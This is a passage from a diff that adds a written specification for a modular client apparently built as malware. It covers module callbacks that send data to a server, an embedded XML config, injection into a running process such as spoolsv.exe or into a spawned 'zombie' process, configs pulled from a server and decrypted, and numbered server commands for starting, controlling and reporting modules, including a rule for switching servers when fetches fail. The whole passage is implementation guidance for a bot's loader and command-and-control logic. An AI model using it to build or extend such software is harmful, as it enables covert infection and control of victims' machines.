+	PVOID Context);
+ModuleHandle - descriptor of the module returned by the Start function.
+EventName - string containing the event name. The maximum length is 128 bytes, the excess should be cut off
+EventInfo - buffer with a string associated with the event. Maximum length 1024 bytes, the excess should be cut off.
+pOutData - pointer to the buffer with a block of data to be sent to the server
+OutDataSize - size of data in the pOutData buffer
+pOutDataTag - buffer for the auxiliary tag that will be sent to the server. The maximum length is 128 bytes, the excess should be cut off.
+Context - value copied by the module from the EventCallbackContext parameter in the Start function
+For security reasons, the Context parameter should be checked for validity, so the above logic should maintain an array of matching pairs ModuleHadle=Context. Alternatively, you can only use one Context value at all.
+7 A module somewhere in the middle of its body contains its config. The config is an ANSI encoded xml, framed at the ends with tags "<moduleconfig>" and "</moduleconfig>". The config is intended solely for the above logic and has the following format:
+<moduleconfig>
+<autostart>yes</autostart>
+<autocontrol>
+<control ctl="test1" arg="cXdlcnR5MTIzNDU2Nzg5MA=="/>
+<control ctl="test2" arg="cXdlcnR5MTIzNDU2Nzg5MA=="/>
+</autocontrol>
+<processname>spoolsv.exe</processname>
+<needinfo name="id"/>
+<needinfo name="ip"/>
+<needinfo name="parentfiles"/>
+<autoconf>
+<conf ctl="test1" file="qwerty" period="30"/>
+<conf ctl="test2" file="123456" period="180"/>
+</autoconf>
+</moduleconfig>
+If the <autostart> tag is set and it is "yes", the module is started automatically after each run of the above logic.
+If the <autocontrol> tag is set, then after calling the Start function, the Control function must be called immediately in order with the specified crl and arg in the <control> tags. The value of the arg attribute must be decoded from base64 before being passed to the Control function.
+If the <processname> tag is specified, the module must be launched in the context of a running process with the specified name. If there is no such process, the module is not launched. If there is more than one such process, it is launched in the context of the first of them. If there is no <processname> tag, the module is launched in a zombie process.
+If the <autoconf> tag is specified, the module needs to pass config contents from the server. The content of the config is transmitted via the CtlArg parameter of the Control function, before transmission the config is checked by digital signature and decrypted. The maximum size of the config after decryption is 8 MB. The attribute "file" specifies the name of the file on the server, the file is requested using the /5/ command. The period attribute specifies the period of receiving the config from the server in minutes. If in the process of receiving a file from the server, an error occurred (the server is unavailable, or the file was not decrypted or checked by digital signature), the attempt is repeated after 30 seconds. If there are more than 5 unsuccessful attempts to get the config, it is a signal to the higher logic that it needs to change the server. The first transfer of configs to the module should be done immediately after calling the Start function, before calling the ctl specified in the <autocontrol> tag. Thus, first autoconf and then autocontrol.
+If the needinfo tag with the name attribute equal to "id" is specified, the ParentID and ParentGroup fields are filled in the ParentInfo structure passed to the Start function. If the needinfo tag with the name attribute equal to "ip" is specified in the ParentInfo structure passed to the Start function, the ParentIP field is filled in.
+After the module body is updated, its config parameters are updated as well.
+7.1 If a module is marked as autostartable, it must be started as soon as possible after the above logic is started, even before communication with the server.
+CAUTION: If <autoconf> tags are specified and there is no communication with the server (yet) and no configs have been passed to the module yet, then the configs that were requested in the last successful attempt must be passed. In this regard, the above logic should store the contents of the configs after each successful request from the server (as well as after successful decryption and verification by digital signature). If neither is available, no data is transmitted.
+8 The module is controlled via the /62/ command. After executing any ctl other than "release", the client must report its results to the server. If the ctl differs from start" and "release", the Control function is called. Before passing an argument to Start or Control functions, it must be decoded from base64.
+The results are reported through the /63/ command. If the Start or Control function returns 0 or FALSE, it is reported via the /14/ command.
+Reporting through the /14/ command is performed in the format /14/<module name>/<ctl> <reason>/, where module name is the name of the module with the suffix "32"/"64", ctl is the name of the ctl. The reason is specified as a short string (the content of the string with the reason is at the developer's discretion, the main requirements are brevity and informativeness). For example, /14/xyz64/start failed/ - when working with module xyz64 the function start returned zero, /14/xyz32/getinfo no_instance/ when working with module xyz2 the function ctl getinfo could not be executed because the process with the module was destroyed.
+8.1 The following situations are possible with ctl="start":
+The module was not started - in this case the module is loaded into the target process
+The module was started, but its process no longer exists - in this case the module is loaded into the target process (if the processname tag is specified in the module's config, no actions are performed) and the Start function is called.
+The module has been started and its process exists - if the processname tag is specified in the module's config, the module's Release function is called, after which the Start function is called again. If the processname tag is not specified, the Release function is called, after which the zombie process is destroyed, a new zombie process is created and the Start function is called.
+8.2 When ctl="release" the following situations are possible:
+The module has not been started - in this case no action is performed
+The module was started, but its process no longer exists - in this case no actions are performed, all structures and data related to the module are cleared and it is considered that it was not started.
+The module was started and its process exists - if the processname tag is specified in the module's config, the Release function of the module is called and no further actions are performed. If the processname tag is not specified, then the Release function is called, after which the zombie process is destroyed
+8.3 If ctl is not equal to "release" and "start", the following situations are possible:
+The module was not started - in this case no action is taken, a report is sent to the server via the /14/ command
+The module was started, but its process no longer exists - in this case no actions are performed, all structures and data related to the module are cleared and it is considered that it was not started. A report is sent to the server via the /14/ command.
+The module was started and its process exists - the Control function is called with stl and passed arguments.
